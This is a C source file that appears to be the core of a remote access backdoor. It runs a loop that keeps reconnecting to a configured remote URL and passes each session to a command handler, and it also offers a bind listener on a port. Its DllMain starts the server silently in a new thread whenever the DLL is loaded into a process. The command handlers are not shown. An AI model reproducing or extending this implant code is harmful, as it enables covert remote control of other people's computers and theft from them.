#include "session.h"
#include "config.h"


THREAD_CALLBACK_FUNC(listenport_proc)
{
	while(1)
	{
		SOCKET s = tcp_listen(g_config.listenport);
		if(s!=-1)
		{
			SOCKET ac;
			while(ac = socket_accept(s,NULL,NULL),ac!=-1)
			{
				thread_instance t;
				thread_create(&t,THREAD_CALLBACK(session_handle_inthread),(void*)ac);
				thread_close(&t);
			}
		}
		else
		{
			time_wait(g_config.timewait*1000);
		}
	}
	return 0;
}

THREAD_CALLBACK_FUNC(connectport_proc)
{
	while(1)
	{
		struct sockaddr sa;
		SOCKET s = -1;
		if( get_sockaddr_by_url(g_config.url,g_config.name,g_config.timewait,&sa)
			||	get_sockaddr_by_string(g_config.url,&sa))
		{
			s = tcp_connect(&sa,g_config.timeout);
		}
		if(s!=-1)
		{
			session_handle(s,command_proc_list);
			socket_close(s);
		}
		else
		{
			time_wait(g_config.timewait*1000);
		}
	}
	return 0;
}


int server_main(int argc,char** argv)
{
	//Read config from raw_config
	read_config(&g_raw_config,&g_config);

	//init socket
	if(socket_init()<=0)return -1;

	//start work

	int connectport_enable = 0;
	int listenport_enable = 0;

	if(g_config.url[0]!='\0')
	{
		connectport_enable = 1;
	}

	if(g_config.listenport!=0)
	{
		listenport_enable = 1;
	}

	thread_instance ti_connectport;
	thread_instance ti_listenport;
	
	if(connectport_enable)
	{
		thread_create(&ti_connectport,THREAD_CALLBACK(connectport_proc),NULL);
	}

	if(listenport_enable)
	{
		thread_create(&ti_listenport,THREAD_CALLBACK(listenport_proc),NULL);
	}

	if(connectport_enable)
	{
		thread_join(&ti_connectport);
		thread_close(&ti_connectport);
	}

	if(listenport_enable)
	{
		thread_join(&ti_listenport);
		thread_close(&ti_listenport);
	}

	//quit
	socket_clean();
	return 0;
}


//Windows DLL entry
DWORD WINAPI DLLProc(LPVOID p)
{
	HANDLE hDLL = (HANDLE)p;
    server_main(0,NULL);
    Sleep(5000);
    FreeLibraryAndExitThread(hDLL,0);
    return 0;
}
BOOL APIENTRY DllMain(HANDLE hModule,DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        {
            HANDLE h = CreateThread(NULL,0,DLLProc,hModule,0,NULL);
            CloseHandle(h);
        }
        break;
        case DLL_PROCESS_DETACH:
        break;
        case DLL_THREAD_ATTACH:
        break;
        case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}


//Windows EXE entry
int main(int argc, char** argv)
{
	return server_main(argc,argv);
}
